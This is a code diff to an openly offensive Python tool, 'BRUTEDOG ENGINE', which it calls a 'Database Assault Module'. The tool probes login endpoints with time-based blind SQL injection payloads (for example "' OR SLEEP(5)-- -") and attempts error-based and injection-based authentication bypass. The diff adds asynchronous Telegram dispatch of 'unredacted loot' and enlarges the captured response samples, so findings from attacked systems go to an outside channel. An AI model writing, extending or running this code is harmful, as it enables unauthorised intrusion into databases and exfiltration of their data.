@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine v7.6
+BRUTEDOG ENGINE v8.0 — Polymorphic Adaptive Database Assault Module (Hardened with Telegram Telemetry)
 Features:
 - Dual-probe confirmed baseline latency calibration for verified time-based blind SQLi
 - Real-time error-pattern fingerprinting & adaptive payload mutation
 - Polymorphic type-variant fuzzing with strict anti-HTML / anti-SPA verification gates
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
-- Zero-disk live terminal streaming with robust color mapping
+- Real-time asynchronous Telegram notification dispatch for unredacted loot/findings
 """
 import asyncio
 import http.client
@@ -17,9 +17,10 @@ import sys
 import re
 from urllib.parse import urlsplit
 
-# Import centralized framework telemetry and immutable loot persistence
+# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 REQUEST_TIMEOUT = 12
 MAX_RESPONSE_SIZE = 128 * 1024
@@ -39,6 +40,17 @@ def log(msg, color="GREEN"):
     ansi_color = COLORS.get(color, color)
     sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
     sys.stdout.flush()
+
+def dispatch_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 SQL_TIME_PAYLOADS = [
     "' OR SLEEP(5)-- -",
@@ -93,7 +105,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             ct = "application/x-www-form-urlencoded"
             
         headers = {
-            "User-Agent": "BruteDog-AdaptiveDB/5.6",
+            "User-Agent": "BruteDog-AdaptiveDB/8.0",
             "Content-Type": ct,
             "Accept": "*/*",
             "Connection": "close"
@@ -157,7 +169,6 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
         for payload in SQL_TIME_PAYLOADS:
             res1 = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
             if res1["elapsed"] >= time_threshold:
-                # Confirm with a second validation probe to eliminate network jitter false positives
                 log(f"[*] Potential time delay detected ({res1['elapsed']}s). Running confirmation probe...", "YELLOW")
                 res2 = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
                 
@@ -166,6 +177,8 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                     finding = {"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delays": [res1["elapsed"], res2["elapsed"]]}
                     findings.append(finding)
                     
+                    # Dispatch to Telegram and Disk
+                    dispatch_tg_alert_sync("Time-Based Blind SQLi Confirmed", finding)
                     stream_proof("DB_TIME_BASED_SQLI_CONFIRMED", endpoint, {"payload": payload}, f"Verified Delays: {res1['elapsed']}s, {res2['elapsed']}s", finding)
                     save_session_loot(
                         target=target_host,
@@ -193,6 +206,8 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                     finding = {"vector": f"Error-Based Inference [{variant_type}]", "endpoint": endpoint, "error": error_match.group(0)}
                     findings.append(finding)
                     
+                    # Dispatch to Telegram and Disk
+                    dispatch_tg_alert_sync(f"Database Error Leak ({vector['name']})", finding)
                     stream_proof("DB_ERROR_LEAK", endpoint, {"vector": vector["name"]}, error_match.group(0), finding)
                     save_session_loot(
                         target=target_host,
@@ -204,14 +219,11 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                         extra_loot=finding
                     )
 
-                # Strict Positive Verification for Bypass:
-                # Must return 200/201/302, have substantive body length, NOT be an HTML/SPA shell, 
-                # and contain verified auth/data indicators.
                 is_spa_or_html = (
                     "<!doctype html>" in body_lower or 
                     "<html" in body_lower or 
-                    '<div id="root"></div>' in body or 
-                    '<div id="__next"></div>' in body or
+                    '<div id="root"></div>' in res["body"] or 
+                    '<div id="__next"></div>' in res["body"] or
                     len(res["body"].strip()) < 50
                 )
                 
@@ -225,9 +237,16 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                 if res["status"] in (200, 201, 302) and not is_spa_or_html and has_auth_indicators:
                     log(f"[+] VERIFIED DATABASE BYPASS / EXFILTRATION [{endpoint}] ({vector['name']} - {variant_type})", "GREEN")
                     log(f"  └── Response Excerpt: {res['body'][:150]}", "CYAN")
-                    finding = {"vector": f"Polymorphic Injection [{variant_type}]", "endpoint": endpoint, "payload": str(payload), "response_sample": res["body"][:100]}
+                    finding = {
+                        "vector": f"Polymorphic Injection [{variant_type}]", 
+                        "endpoint": endpoint, 
+                        "payload": str(payload), 
+                        "response_sample": res["body"][:300]
+                    }
                     findings.append(finding)
                     
+                    # Dispatch verified bypass loot straight to Telegram and Disk
+                    dispatch_tg_alert_sync(f"Database Polymorphic Bypass Verified ({vector['name']})", finding)
                     stream_proof("DB_BYPASS_VERIFIED", endpoint, {"vector": vector["name"]}, res["body"][:300], finding)
                     save_session_loot(
                         target=target_host,
